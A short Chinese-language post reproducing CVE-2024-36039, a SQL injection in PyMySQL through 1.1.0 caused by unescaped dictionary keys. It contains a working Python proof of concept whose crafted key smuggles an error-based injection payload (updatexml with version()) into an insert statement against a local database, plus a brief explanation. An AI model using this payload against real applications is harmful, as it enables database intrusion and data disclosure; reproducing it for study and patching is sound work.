漏洞复现-CVE-2024-36039

漏洞描述

PyMySQL through 1.1.0 allows SQL injection if used with untrusted JSON input because keys are not escaped by escape_dict.

（pymysql 报的一个sql注入 之前复现完忘记发了）

poc如下：

import pymysql
​
conn = pymysql.connect(host=”localhost”, user=”root”, password=”root”, database=”security”)
conn.query(“””CREATE TABLE if not exists `NewTable` (
`info` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;”””)
​
sql = “””insert into `NewTable` (info) values(“%(info)s”)”””
​
info = {“info”: {“id”: 1, “name”: “a valid name”}}
badinfo = {“info”: {“id”: 1, ‘name haccck! “ or updatexml(1,concat(0x7e,(version())),0) or””) #’: “a valid name”}}
with conn.cursor() as cur:
  # print(cur.mogrify(sql, info))
  # print(cur.mogrify(sql, badinfo))
  cur.execute(sql, badinfo)
  b = cur.fetchall()
​
  print(b)
conn.commit()

这里利用sql insert语句实现了报错注入

根据漏洞描述是由于json的 key未经转义导致了不安全的恶意注入
